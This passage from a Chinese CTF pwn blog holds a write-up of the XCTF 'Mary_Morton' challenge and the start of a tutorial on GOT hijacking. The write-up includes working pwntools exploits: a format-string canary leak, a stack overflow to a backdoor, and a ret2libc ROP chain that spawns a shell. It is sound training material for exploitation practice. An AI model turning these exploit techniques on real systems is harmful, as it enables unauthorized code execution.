        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge$ checksec Mary_Morton<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/Mary_Morton'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>Canary  NX防护打开</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall __noreturn <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+24h] [rbp-Ch]</span>  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4009FF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  #setbuf   <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to the battle ! "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[Great Fairy] level pwned "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Select your weapon "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">sub_4009DA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           #输出提示符      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">sub_4008EB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    #格式化字符串漏洞    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Bye "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token function">sub_400960</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>           #存在溢出    <span class="token keyword">else</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>后门：<span class="token keyword">int</span> <span class="token function">sub_4008DA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat ./flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>如果没有后门这个题会让我呛得慌</code></pre><h3 id="函数sub-4008EB-："><a href="#函数sub-4008EB-：" class="headerlink" title="函数sub_4008EB()："></a>函数sub_4008EB()：</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_4008EB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-90h]     #别误以为buf是大小为90h的数组，擦亮眼睛</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+88h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">127uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>read函数只能读入127个字符，无法溢出，显然只能利用下面的格式化字符串漏洞。<br>printf因为RELRO关闭可改写got表，以及其他数据，泄露地址那是基本能力。</p><h3 id="函数sub-400960："><a href="#函数sub-400960：" class="headerlink" title="函数sub_400960："></a>函数sub_400960：</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_400960</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-90h]</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+88h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">256uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-> %s\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里read可以往buf地址处读入256个字符，而buf离RBP距离为90h所以存在溢出。但别忘了canary开启。<br>canary一般就在RBP上面，如果不记得了可以看汇编代码：</p><pre class=" language-bash"><code class="language-bash">buf<span class="token operator">=</span> byte ptr -90hvar_8<span class="token operator">=</span> qword ptr -8<span class="token punctuation">;</span> __unwind <span class="token punctuation">{</span>push    rbpmov     rbp, rspsub     rsp, 90hmov     rax, fs:28hmov     <span class="token punctuation">[</span>rbp+var_8<span class="token punctuation">]</span>, rax        <span class="token comment" spellcheck="true">#[rbp+var_8]就是rbp-8即rbp上面一个栈帧</span>xor     eax, eaxlea     rdx, <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span></code></pre><h2 id="3：思路"><a href="#3：思路" class="headerlink" title="3：思路"></a>3：思路</h2><h3 id="综上"><a href="#综上" class="headerlink" title="综上"></a>综上</h3><ul><li>canary，NX开启</li><li>整个程序存在格式化字符串漏洞和溢出漏洞</li><li>存在后门</li><li>所以利用格式化字符串漏洞泄露canary，每个char buf都会被插入cookie</li><li>padding+cookie绕过canary，控制程序流程</li></ul><h3 id="格式化字符串漏洞泄露偏移量"><a href="#格式化字符串漏洞泄露偏移量" class="headerlink" title="格式化字符串漏洞泄露偏移量"></a>格式化字符串漏洞泄露偏移量</h3><pre><code>Welcome to the battle ! [Great Fairy] level pwned Select your weapon 1. Stack Bufferoverflow Bug 2. Format String Bug 3. Exit the battle 2AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%pAAAAAAAA0x7ffc11daed70.0x7f.0x7f82284ed081.(nil).(nil).0x4141414141414141.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e701. Stack Bufferoverflow Bug 2. Format String Bug 3. Exit the battle 闹钟64位就用8个A好看一点，偏移量是6这作者还设了一个闹钟，很烦~~~</code></pre><p>我们来看看sub_4008EB（字符串漏洞）函数的栈分布：<br><img src="https://s1.ax1x.com/2020/07/18/U2sMeU.png" alt=""><br>那么可以很容易算出cookie的偏移位置：(0x90-0x8)/8 + 6 ==&gt;23.</p><p>来试一试：</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge$ ./Mary_Morton Welcome to the battle <span class="token operator">!</span> <span class="token punctuation">[</span>Great Fairy<span class="token punctuation">]</span> level pwned Select your weapon 1. Stack Bufferoverflow Bug 2. Format String Bug 3. Exit the battle 2%23<span class="token variable">$pAAA</span>0xceb50cabb0ce3f00AAA                <span class="token comment" spellcheck="true">#千万记住你后面AAA会接在你泄露地址后面，别把他们当作泄露的一部分了</span>1. Stack Bufferoverflow Bug          <span class="token comment" spellcheck="true">#没错这个离谱的数就是cookie了，有离谱和末尾的00作证</span>2. Format String Bug 3. Exit the battle 闹钟</code></pre><p><strong>泄露成功！什么你说我泄露 sub_4008EB里面的cookie关sub_400960的cookie什么事？我说他们是周树人和鲁迅关系你信吗，反正我信了。</strong></p><p>之后我们进入栈溢出函数构造payload即可实现跳转到后门。</p><h3 id="溢出点计算"><a href="#溢出点计算" class="headerlink" title="溢出点计算"></a>溢出点计算</h3><p>之前我以为有canary，溢出点就很难用gdb测出来了。其实并没有，我们来看看溢出函数栈是啥情况：<br>函数开始的部分汇编代码：</p><pre><code>push    rbpmov     rbp, rspsub     rsp, 90hmov     rax, fs:28hmov     [rbp+var_8], raxxor     eax, eaxlea     rdx, [rbp+buf]</code></pre><p>一般程序栈的返回地址，RBP/EBP会在最前面就布置好，就像上面那样，显然是一般函数的栈分布：<br><img src="https://s1.ax1x.com/2020/07/18/U2suLT.png" alt=""><br>那么payload：’A’*(0x90-8) + p64(cookie) + ‘AAAAAAAA’ + p64(backdoor)</p><h2 id="4-EXP"><a href="#4-EXP" class="headerlink" title="4:EXP"></a>4:EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Mary_Morton'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'%23$pAAA'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>cookie <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> cookiesh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x04008DA</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'AAAAAAAA'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="5-EXP无后门版"><a href="#5-EXP无后门版" class="headerlink" title="5:EXP无后门版"></a>5:EXP无后门版</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'Mary_Morton'</span><span class="token punctuation">)</span>system_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>bss_addr <span class="token operator">=</span> <span class="token number">0x0601080</span>door <span class="token operator">=</span> <span class="token number">0x004008DA</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0400ab3</span><span class="token comment" spellcheck="true">#main : 0x0400826</span><span class="token comment" spellcheck="true">#RDI, RSI, RDX, RCX, R8 R9</span><span class="token comment" spellcheck="true">#0x0000000000400659 : ret</span><span class="token comment" spellcheck="true">#0x0400B2B cat</span><span class="token comment" spellcheck="true">#0400ab3 : pop rdi ; ret</span><span class="token comment" spellcheck="true">#0400960 overflow</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Mary_Morton'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',40551)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"#############leaking the cookie#################"</span>payload <span class="token operator">=</span> <span class="token string">'%23$pAAA'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>cookie <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> cookie<span class="token keyword">print</span> <span class="token string">"#############leaking the puts_addr#################"</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'AAAAAAAA'</span> payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000400659</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#payload += p64(pop_rdi_ret) + p64(0x0400B2B) + p64(system_plt)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000400659</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0400826</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> <span class="token string">'\x00'</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"puts_addr==>"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"libc_addr==>"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> libc_addr<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"#############final attack#################"</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'AAAAAAAA'</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000400659</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>结果：Welcome to the battle ! <span class="token punctuation">[</span>Great Fairy<span class="token punctuation">]</span> level pwned Select your weapon <span class="token number">1</span><span class="token punctuation">.</span> Stack Bufferoverflow Bug <span class="token number">2</span><span class="token punctuation">.</span> Format String Bug <span class="token number">3</span><span class="token punctuation">.</span> Exit the battle <span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x2</span> bytes<span class="token punctuation">:</span>    <span class="token string">'1\n'</span><span class="token comment" spellcheck="true">#############final attack#################</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0xb9</span> bytes<span class="token punctuation">:</span>    <span class="token number">00000000</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  │AAAA│AAAA│AAAA│AAAA│    <span class="token operator">*</span>    <span class="token number">00000080</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">00</span> d0 eb ef  e0 eb d0 <span class="token number">4c</span>  │AAAA│AAAA│····│···L│    <span class="token number">00000090</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">59</span> <span class="token number">06</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  │AAAA│AAAA│Y·@·│····│    <span class="token number">000000a0</span>  b3 <span class="token number">0a</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">9a</span> <span class="token number">4e</span> <span class="token number">3a</span> <span class="token number">79</span>  <span class="token number">16</span> <span class="token number">7f</span> <span class="token number">00</span> <span class="token number">00</span>  │··@·│····│·N<span class="token punctuation">:</span>y│····│    <span class="token number">000000b0</span>  <span class="token number">40</span> <span class="token number">04</span> <span class="token number">24</span> <span class="token number">79</span>  <span class="token number">16</span> <span class="token number">7f</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">0a</span>                        │@·$y│····│·│    <span class="token number">000000b9</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x8c</span> bytes<span class="token punctuation">:</span>    <span class="token string">'-> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span><span class="token operator">-</span><span class="token operator">></span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'hunter\n'</span>hunter<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wiki-hijack GOT</title>
      <link href="/2020/07/17/wiki-hijack-got/"/>
      <url>/2020/07/17/wiki-hijack-got/</url>
      
        <content type="html"><![CDATA[<h2 id="1：原理"><a href="#1：原理" class="headerlink" title="1：原理"></a>1：原理</h2><p>在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，<strong>在没有开启 RELRO（即 partial RELRO）前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的</strong>。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</p><p>假设我们将函数 A 的地址覆盖为函数 B 的地址，那么这一攻击技巧可以分为以下步骤：</p><ul><li><p><strong>确定函数 A 的 GOT 表地址</strong><br>   这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。IDA或是ELF等</p></li><li><p><strong>确定函数 B 的内存地址</strong><br>   这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。</p></li><li><p><strong>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处</strong></p></li></ul><p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下3种</p><blockquote><p>写入函数：write 函数。</p></blockquote><blockquote><p>ROP:<br>pop eax; ret;           # printf@got -&gt; eax<br>pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx 函数间的偏移量<br>add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</p></blockquote><blockquote><p>格式化字符串任意地址写</p></blockquote><h2 id="2：例子2016-CCTF-–-pwn3"><a href="#2：例子2016-CCTF-–-pwn3" class="headerlink" title="2：例子2016 CCTF – pwn3"></a>2：例子2016 CCTF – pwn3</h2><h3 id="checksec："><a href="#checksec：" class="headerlink" title="checksec："></a>checksec：</h3><pre class=" language-c"><code class="language-c">hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>wiki<span class="token operator">/</span>formal$ checksec pwn3<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/wiki/formal/pwn3'</span>    Arch<span class="token punctuation">:</span>     i386<span class="token number">-32</span><span class="token operator">-</span>little    RELRO<span class="token punctuation">:</span>    Partial RELRO    Stack<span class="token punctuation">:</span>    No canary found    NX<span class="token punctuation">:</span>       NX enabled           #只开了NX    PIE<span class="token punctuation">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span></code></pre><h3 id="IDA："><a href="#IDA：" class="headerlink" title="IDA："></a>IDA：</h3><p><img src="https://s1.ax1x.com/2020/07/17/U6yi26.png" alt=""><br>ask_username(&amp;s1)和ask_password(&amp;s1)函数可以很容易得出：要输入rxraclhm。<br>get_command()函数，就是输入get，put，dir然后会进入下面相应的函数，如果输入其他的直接退出程序<br>接下来隆重介绍以下函数：<br><strong>put_file（）函数</strong></p><pre class=" language-c"><code class="language-c">_DWORD <span class="token operator">*</span><span class="token function">put_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4     #v0是一个指针，其大小为DWORD4个字节</span>  _DWORD <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  v0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">244u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     #malloc函数开辟一个大小为<span class="token number">244</span>的堆区  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"please enter the name of the file you want to upload:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">get_input</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v0<span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    #get_input函数别有乾坤  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"then, enter the content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">get_input</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v0 <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span> <span class="token operator">=</span> file_head<span class="token punctuation">;</span>        #file_head是一个全局变量<span class="token punctuation">,</span> BSS段  result <span class="token operator">=</span> v0<span class="token punctuation">;</span>  file_head <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token 